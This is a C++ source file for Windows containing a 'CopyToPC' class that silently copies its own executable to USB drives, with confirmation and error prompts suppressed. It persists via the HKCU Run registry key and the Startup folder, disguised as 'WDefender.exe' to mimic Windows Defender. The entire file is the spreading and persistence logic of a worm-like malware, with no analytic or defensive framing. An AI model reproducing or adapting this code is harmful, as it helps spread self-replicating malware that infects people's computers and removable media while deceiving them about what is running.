#include "CopyToPC.h"

void CopyToPC::FindPath() {
	char temp_str[1024];
	SecureZeroMemory(temp_str, sizeof(temp_str));
	for (int i = 0; i < lstrlen(copy_from); i++) {
		if (copy_from[i] == 'W' && copy_from[i + 1] == 'D' && copy_from[i + 2] == 'e' && copy_from[i + 3] == 'f' && copy_from[i + 4] == 'e' && copy_from[i + 5] == 'n' && copy_from[i + 6] == 'd') {
			break;
		}
		temp_str[i] = copy_from[i];
	}
	strcpy_s(copy_from, temp_str);
}

void CopyToPC::CopyPaste() {
	this->copy_from[lstrlen(copy_from) + 1] = '\0';
	this->copy_from[lstrlen(copy_from) + 1] = '\0';
	this->copy_to[lstrlen(copy_to) + 1] = '\0';
	this->copy_to[lstrlen(copy_to) + 1] = '\0';

	SHFILEOPSTRUCT fos;
	ZeroMemory(&fos, sizeof(fos));

	fos.hwnd = NULL;
	fos.wFunc = FO_COPY;
	fos.pFrom = copy_from;
	fos.pTo = copy_to;
	fos.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
	SHFileOperation(&fos);
}

void CopyToPC::RegEdit() {
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hkey, NULL)) {
		RegSetValueEx(hkey, "WDefender.exe", NULL, REG_SZ, reinterpret_cast<const BYTE*>(&szPath), sizeof(szPath));
		RegCloseKey(hkey);
	}
	SecureZeroMemory(copy_to, 0x100);
	SecureZeroMemory(copy_from, 0x100);
	strcpy_s(copy_to, "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WDefender.exe");
	GetModuleFileName(NULL, copy_from, sizeof(copy_from));

	CopyFile(copy_from, copy_to, FALSE);
}

void CopyToPC::Copy_to_flash(char * path) {
	char copyfrom[1024], copyto[1024];
	SecureZeroMemory(copyfrom, sizeof(copyfrom));
	SecureZeroMemory(copyto, sizeof(copyto));
	strcpy_s(copyfrom, "C:\\Windows\\FreeAntivirus\\");
	strcpy_s(copyto, path);

	copyfrom[lstrlen(copyfrom) + 1] = '\0';
	copyfrom[lstrlen(copyfrom) + 1] = '\0';
	copyto[lstrlen(copyto) + 1] = '\0';
	copyto[lstrlen(copyto) + 1] = '\0';

	SHFILEOPSTRUCT fos;
	ZeroMemory(&fos, sizeof(fos));

	fos.hwnd = NULL;
	fos.wFunc = FO_COPY;
	fos.pFrom = copyfrom;
	fos.pTo = copyto;
	fos.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
	SHFileOperation(&fos);
}

CopyToPC::CopyToPC() {
	SecureZeroMemory(szPath, 0x100);
	SecureZeroMemory(copy_from, sizeof(copy_from));
	SecureZeroMemory(copy_to, sizeof(copy_to));
	strcpy_s(copy_to, "E:\\");
	GetModuleFileNameA(NULL, copy_from, 1024);
	
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	PeekMessage(NULL, NULL, NULL, NULL, NULL);
}

CopyToPC::~CopyToPC() {
}